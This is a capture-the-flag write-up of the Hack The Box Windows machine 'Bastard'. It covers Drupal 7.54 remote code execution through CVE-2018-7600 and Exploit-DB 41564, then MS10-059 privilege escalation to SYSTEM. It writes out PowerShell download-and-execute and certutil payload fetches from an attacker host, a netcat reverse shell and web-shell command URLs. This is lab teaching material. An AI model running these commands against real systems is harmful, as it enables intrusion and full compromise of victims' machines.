# Hack The Box — Bastard

**Platform:** Hack The Box
**Machine Name:** Bastard
**OS:** Windows
**Difficulty:** Medium
**IP Address:** `10.129.77.113`

---

## Overview

Today we are back with another **Hack The Box Windows-based machine**, named **Bastard**.

The machine exposes a web server running **Microsoft IIS 7.5** and hosting **Drupal 7.54**. After enumerating the application and identifying the Drupal version, we explored multiple Drupal RCE paths.

The final attack chain used Drupal RCE to obtain command execution as `nt authority\iusr`, followed by Windows privilege escalation to obtain an `NT AUTHORITY\SYSTEM` shell.

```text
Port Scanning
      ↓
IIS 7.5 / Drupal 7.54
      ↓
Drupal RCE
      ↓
nt authority\iusr
      ↓
Reverse Shell
      ↓
Windows Privilege Escalation
      ↓
NT AUTHORITY\SYSTEM
      ↓
User + Root Flags
```

---

# Table of Contents

* [Machine Information](#machine-information)
* [Reconnaissance](#reconnaissance)
* [Port Scanning](#port-scanning)
* [Web Enumeration](#web-enumeration)
* [Identifying Drupal 7.54](#identifying-drupal-754)
* [Initial Drupal RCE Attempt](#initial-drupal-rce-attempt)
* [Drupal Services Module RCE](#drupal-services-module-rce)
* [Obtaining Command Execution](#obtaining-command-execution)
* [Alternative Drupalgeddon2 Exploit](#alternative-drupalgeddon2-exploit)
* [Getting a Reverse Shell](#getting-a-reverse-shell)
* [Privilege Enumeration](#privilege-enumeration)
* [Privilege Escalation](#privilege-escalation)
* [Obtaining SYSTEM](#obtaining-system)
* [Flag Enumeration](#flag-enumeration)
* [Attack Path Summary](#attack-path-summary)
* [Key Takeaways](#key-takeaways)
* [Tools Used](#tools-used)
* [Disclaimer](#disclaimer)

---

# Machine Information

| Information | Details           |
| ----------- | ----------------- |
| Machine     | Bastard           |
| Platform    | Hack The Box      |
| OS          | Windows           |
| Difficulty  | Medium            |
| IP          | `10.129.77.113`   |
| Web Server  | Microsoft IIS 7.5 |
| CMS         | Drupal 7.54       |

---

# Reconnaissance

We begin with enumeration of the target IP:

```text
10.129.77.113
```

The first step was a standard Nmap port scan.

---

# Port Scanning

```bash
nmap 10.129.77.113
```

The initial scan returned:

```text
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown
```

The important service here was port `80`, which indicated that a web application was available.

We continued with service and version detection.

```bash
nmap -sC -sV 10.129.77.113
```

The scan identified:

```text
80/tcp    open  http    Microsoft IIS httpd 7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
```

Nmap also identified the web application:

```text
http-generator: Drupal 7
```

and the web server:

```text
Microsoft-IIS/7.5
```

The HTTP title was:

```text
Welcome to Bastard | Bastard
```

---

# Web Enumeration

Since port `80` was open, we started investigating the web application.

The Nmap HTTP scripts also discovered a `robots.txt` file containing numerous disallowed paths, including:

```text
/includes/
/misc/
/modules/
/profiles/
/scripts/
/themes/
/admin/
/user/login/
/user/register/
/node/add/
/search/
```

The application was clearly running **Drupal**.

We also added the target to our `/etc/hosts` file so that the hostname could be resolved locally:

```text
10.129.77.113 bastard.htb
```

---

# Identifying Drupal 7.54

Further enumeration revealed the Drupal version:

```text
Drupal 7.54, 2017-02-01
```

This was particularly interesting because older Drupal 7 versions are affected by serious remote code execution vulnerabilities.

One of the major vulnerabilities associated with the Drupal 7 series is:

```text
CVE-2018-7600
Drupalgeddon2
```

This vulnerability can allow unauthenticated remote code execution against vulnerable Drupal installations.

With this information, exploitation became the next objective.

---

# Initial Drupal RCE Attempt

We first explored the available Metasploit module:

```text
exploit(unix/webapp/drupal_drupalgeddon2)
```

We configured the callback address:

```text
set LHOST 10.10.15.95
```

and the target:

```text
set RHOSTS bastard.htb
```

Then we executed the module:

```text
run
```

Metasploit started the reverse TCP handler:

```text
[*] Started reverse TCP handler on 10.10.15.95:4444
```

However, this approach did not provide the expected result.

Since the target was a **Windows** machine, we explored alternative implementations of the Drupal exploitation technique.

---

# Drupal Services Module RCE

We also investigated the Drupal Services Module RCE exploit.

The exploit used was based on:

```text
Exploit-DB 41564
```

After modifying the exploit for the target environment, we executed:

```bash
php 41564.php
```

The exploit produced:

```text
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://bastard.htb//dixuSOspsOUU.php
```

The exploit also generated a `session.json` file containing session information:

```json
{
    "session_name": "SESS3be1999be4b134a44bef1e6c979c5741",
    "session_id": "7toql-28uh6KE739TW2YTeEaBDccvKA3m6zTfz7NKzw",
    "token": "ImOXF3phnZGy3Td8eg1o7PB1gaCeNUWsywz6_jU1vAU"
}
```

This gave us another path toward command execution.

---

# Obtaining Command Execution

We modified the generated exploit/file to execute commands through the web application.

For example:

```text
http://bastard.htb/nk.php?cmd=whoami
```

Executing `whoami` returned:

```text
nt authority\iusr
```

This confirmed that we had achieved command execution on the target.

The current execution context was:

```text
nt authority\iusr
```

Although this was not yet SYSTEM, it provided a foothold on the Windows server.

---

# Alternative Drupalgeddon2 Exploit

Another approach we explored was a standalone implementation of **CVE-2018-7600**.

The exploit was executed with:

```bash
python3 drupa7-CVE-2018-7600.py http://bastard.htb/ -c whoami
```

The exploit identified the target as vulnerable and executed the command:

```text
[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-b-nb7otrPKqpqwDAAuAEFaHhjKf62FhSJEr6PM62u4s
[*] Triggering exploit to execute: whoami

nt authority\iusr
```

This confirmed that the Drupal RCE could reliably be used to execute commands as:

```text
nt authority\iusr
```

---

# Getting a Reverse Shell

With command execution established, we needed a more interactive shell.

One method was to use a PowerShell-based reverse shell.

For example, a Nishang PowerShell script could be retrieved with:

```powershell
powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.95:800/shell.ps1')
```

Another approach used `certutil` to download `nc64.exe` onto the target.

```bash
python3 drupa7-CVE-2018-7600.py http://bastard.htb/ -c "certutil -urlcache -f http://10.10.15.95:8/nc64.exe nc64.exe"
```

After the executable was transferred, we used it to establish a reverse shell:

```bash
python3 drupa7-CVE-2018-7600.py http://bastard.htb/ -c "nc64.exe -e cmd.exe 10.10.15.95 7777"
```

This gave us an interactive Windows shell.

---

# Privilege Enumeration

Once we had a shell, we checked the privileges associated with the current account.

```cmd
whoami /priv
```

The output showed:

```text
PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State
----------------------  ----------------------------------------  -------
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

The presence of:

```text
SeImpersonatePrivilege
```

was particularly interesting and indicated that the current context had an available privilege that could be relevant to Windows privilege escalation.

---

# Privilege Escalation

We explored Windows privilege escalation options.

One of the approaches mentioned during enumeration was the **MS10-059** Windows kernel exploit.

The exploit executable was transferred to the target using `certutil`:

```cmd
certutil -urlcache -f http://10.10.15.95:8/MS10-059.exe MS10-059.exe
```

We then executed it with our attacking machine's IP and listener port:

```cmd
MS10-059.exe 10.10.15.95 8888
```

On the attacking machine, we started a listener:

```bash
rlwrap nc -lvnp 8888
```

The connection was received:

```text
Listening on 0.0.0.0 8888
Connection received on 10.129.77.113 49572
```

A Windows command shell was then obtained.

---

# Obtaining SYSTEM

We verified our privileges:

```cmd
whoami
```

The result was:

```text
nt authority\system
```

We had successfully escalated from:

```text
nt authority\iusr
```

to:

```text
NT AUTHORITY\SYSTEM
```

At this point, the machine was fully compromised.

---

# Flag Enumeration

With SYSTEM privileges, we moved to the Administrator desktop.

```cmd
cd C:\Users\Administrator\Desktop
```

The root flag was located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

It was read with:

```cmd
type root.txt
```

We also located the user flag under the `dimitris` user's desktop:

```cmd
cd C:\Users\dimitris\Desktop
```

The user flag was:

```text
C:\Users\dimitris\Desktop\user.txt
```

and was read using:

```cmd
type user.txt
```

---

# Attack Path Summary

The complete attack chain was:

```text
                     Target
                        |
                        v
                10.129.77.113
                        |
                        v
                  Port 80 / IIS
                        |
                        v
                   Drupal 7.54
                        |
                        v
              CVE-2018-7600 RCE
                        |
                        v
               nt authority\iusr
                        |
                        v
                Reverse Shell
                        |
                        v
             Privilege Enumeration
                        |
                        v
                  MS10-059
                        |
                        v
              NT AUTHORITY\SYSTEM
                    /       \
                   /         \
                  v           v
             user.txt     root.txt
```

---

# Key Takeaways

* Always investigate the technology and version behind a web application.
* `robots.txt` can expose useful information about application structure.
* Identifying the exact Drupal version can lead directly to relevant vulnerability research.
* Drupal 7.54 provided an important path toward remote code execution.
* When an exploit behaves unexpectedly, understanding the target's operating system and reviewing alternative exploit implementations can be valuable.
* After obtaining an initial shell, enumerate Windows privileges with:

```cmd
whoami /priv
```

* Windows privilege escalation can involve both assigned privileges and vulnerable system components.
* Always verify the final privilege level with:

```cmd
whoami
```

* Obtaining `NT AUTHORITY\SYSTEM` provides the highest level of local privileges on the Windows system.

---

# Tools Used

* Nmap
* Metasploit Framework
* Drupalgeddon2
* Exploit-DB
* Python
* PHP
* Certutil
* Netcat
* Nishang
* Windows command shell

---

# Final Notes

Bastard was a good example of how a vulnerable web application can provide the initial foothold on a Windows machine.

The machine combined:

```text
Web Enumeration
      ↓
Drupal Version Identification
      ↓
Remote Code Execution
      ↓
Initial Shell
      ↓
Privilege Escalation
      ↓
SYSTEM
```

The biggest lesson from the machine is to avoid stopping after obtaining initial command execution. Once a foothold is established, privilege enumeration and careful investigation of the Windows environment can reveal the path toward full system compromise.

---

## Disclaimer

This writeup is intended for **educational purposes and authorized security testing only**.

All testing described here was performed against a Hack The Box machine in an authorized lab environment. Do not attempt these techniques against systems you do not own or have explicit permission to test.
